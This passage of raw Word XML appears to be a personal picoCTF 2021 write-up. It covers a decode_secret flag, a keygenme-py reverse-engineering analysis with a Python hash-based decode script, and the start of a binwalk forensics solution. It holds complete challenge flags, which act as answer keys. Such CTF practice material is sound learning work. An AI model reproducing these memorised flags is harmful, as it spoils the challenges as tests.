      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CA575B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second number? "</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A1A4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greatest_value</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need a value to return if 1 &amp; 2 are equal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E2443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02F978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&gt;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5CD5581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greatest_value</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p>
    <w:p w14:paraId="7FA1EEE1"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elif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&lt;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02561D3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greatest_value</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user_value_2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CAC451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7E24E7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"The number with largest positive magnitude is "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE9A317"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4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>str</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greatest_value</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>) )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4122A477"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690C2D7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#choose_greatest()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="133A007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CDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>decode_secret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bezos_cc_secret</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151966E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0CC2A497" w14:textId="495C35E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171A2943" w14:textId="3B946349"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The original code did not </w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="5969F6"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t xml:space="preserve"> decode_secret()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CCD8349" w14:textId="46C008C5"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For decoding, we just need to call decode_secret()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="124D0DE3" w14:textId="311A71C4"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C2D08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CDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>decode_secret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bezos_cc_secret</w:t>
      </w:r>
      <w:r w:rsidRPr="007D5169">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E8B3DC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332DF0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picoCTF{1|\/|_4_p34|\|ut_dd2c4616}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A8F296" w14:textId="77777777" w:rsidR="007D5169" w:rsidRDefault="007D5169" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="689C812F" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E90">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="537F72BF" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E90">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="143E0121" w14:textId="5714C968" w:rsidR="002D0E90" w:rsidRPr="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E90">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D0E90">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>keygenme-py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29BE03D0"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79A51E92"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2021Reverse Engineering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E92C957" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E9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7042E3A5" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="002D0E90" w:rsidP="002D0E9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24375D" w14:textId="77777777" w:rsidR="002D0E90" w:rsidRDefault="00000000" w:rsidP="002D0E90">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId93" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="002D0E90">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>keygenme-trial.py</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F035D72" w14:textId="5E42E134" w:rsidR="001F4DD4" w:rsidRDefault="001F4DD4" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46C66660" w14:textId="3DA38226" w:rsidR="00866357" w:rsidRDefault="00866357" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A8AE1A3" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Analysis of original code:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CFF0B65"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username_trial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"PRITCHARD"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F651216"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bUsername_trial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569CD6"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidRPr="00C55B59">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"PRITCHARD"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33739B27"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513F3B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"picoCTF{1n_7h3_|&lt;3y_of_"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="197AB24B"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"xxxxxxxx"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13169AE0"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key_part_static2_trial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
    <w:p w14:paraId="65403C9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key_full_template_trial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key_part_static2_trial</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6270E8" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>It gives the static part of the flag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1792699F" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>For the dynamic part of the flag:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EABD9E" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>It compared the cert with the sha256 hash value of username_trial</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567953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xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="569CD6"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>TODO</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="6A9955"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve"> : test performance on toolbox container</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0791C8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Check dynamic part --v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC1EF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p>
    <w:p w14:paraId="711AA51A"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263CD7D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7316DF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0E552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2EC89F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p>
    <w:p w14:paraId="77761C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9299A8F"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C1B23E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83D71D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48444667"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p>
    <w:p w14:paraId="7E4DB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5991A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lastRenderedPageBreak/>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5DA87C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3B97FB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1E666D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p>
    <w:p w14:paraId="5A7CBFB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7ED318DB"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36D79C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19E68B3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3C77530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p>
    <w:p w14:paraId="48B85D00"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63D4AAB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70A5B63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04B913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0E0E473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p>
    <w:p w14:paraId="54CFD6B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446CDF0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FB40F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9D17DB5"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54D05C3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p>
    <w:p w14:paraId="586EDDE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3043058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63747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61B8726D"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C0AA4A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i</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3F5C5BF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5540C169" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68FE3609" w14:textId="7B6BD7D9" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7344A534" w14:textId="2B82A205" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D8E6378" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2450FCEC" w14:textId="690EF585" w:rsidR="00866357" w:rsidRDefault="00866357" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Decode.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DEDDA16" w14:textId="60FCC9CE" w:rsidR="00C55B59" w:rsidRDefault="00C55B59" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">et the sha256 hash value of username_trial </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CD6DF64" w14:textId="6513E2BF" w:rsidR="00C55B59" w:rsidRDefault="00C55B59" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>nd find each char by the giving position from the hash value.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79277A9C"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hashlib</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A97BA24"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from</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cryptography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4EC9B0"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>fernet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Fernet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29CCE08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base64</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33CD7E38"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E9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D6FFD83"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CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>"PRITCHARD"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5D7C4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encode</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CE9178"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>'utf-8'</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hexdigest</w:t>
      </w:r>
      <w:r w:rsidRPr="00866357">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Times New Roman"/>
          <w:color w:val="D4D4D4"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2974B895"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lastRenderedPageBreak/>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7DDA066A"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CDCAA"/>
          <w:kern w:val="0"/>
          <w:lang w:val="en-CA" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>print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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DC80D15" w14:textId="072C9693" w:rsidR="00866357" w:rsidRDefault="00866357" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F16CDD0" w14:textId="77777777" w:rsidR="00866357" w:rsidRDefault="00866357" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55CDF224" w14:textId="3048B934" w:rsidR="0014279A" w:rsidRDefault="0014279A" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="49" w:name="_Hlk112529627"/>
      <w:r w:rsidRPr="0014279A">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF{1n_7h3_|&lt;3y_of_</w:t>
      </w:r>
      <w:r w:rsidR="00E32EE5" w:rsidRPr="00E32EE5">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>54ef6292</w:t>
      </w:r>
      <w:r w:rsidR="00E32EE5">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
      <w:bookmarkEnd w:id="49"/>
    </w:p>
    <w:p w14:paraId="70F5D47B" w14:textId="21E575A9" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7ADF9B59" w14:textId="6F57A60E" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="108A69B0" w14:textId="29054F7E" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A3E50CB" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D6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Matryoshka doll</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43AE6BC4"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156906F6"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2021Forensics</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="793CCD27" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D6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SUSIE/PANDU</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C973D71" w14:textId="77777777" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D6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11CDDA9" w14:textId="00F847C2" w:rsidR="001B4D67" w:rsidRDefault="001B4D67" w:rsidP="001B4D6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Matryoshka dolls are a set of wooden dolls of decreasing size placed one inside another. What's the final one? Image: </w:t>
      </w:r>
      <w:hyperlink r:id="rId94" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>this</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4FE59573" w14:textId="51B2E0BE" w:rsidR="00E86710" w:rsidRPr="007C33FA" w:rsidRDefault="007C33FA" w:rsidP="001B4D67">
      <w:pPr>
        <w:pStyle w:val="body-md"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="75" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007C33FA">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>solution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B84BF31" w14:textId="6F126FC1" w:rsidR="00E86710" w:rsidRDefault="00E86710" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>xtract files using binwalk</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BC76459" w14:textId="778D40B5" w:rsidR="001B4D67" w:rsidRDefault="00E86710" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E86710">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>binwalk -e dolls.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="660749DF" w14:textId="1E76569B" w:rsidR="00E86710" w:rsidRDefault="00E86710" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve">DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- </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0x0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> PNG image, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>594</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> x </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>1104</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-bit/color RGBA, non-interlaced </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-number"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="880000"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>3226</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0xC9A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> TIFF image data, big-endian, offset of first image </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-symbol"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="BC6060"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>directory:</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272492</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0x4286C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Zip archive data, at least v2.</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to extract, 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378955</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="444444"/>
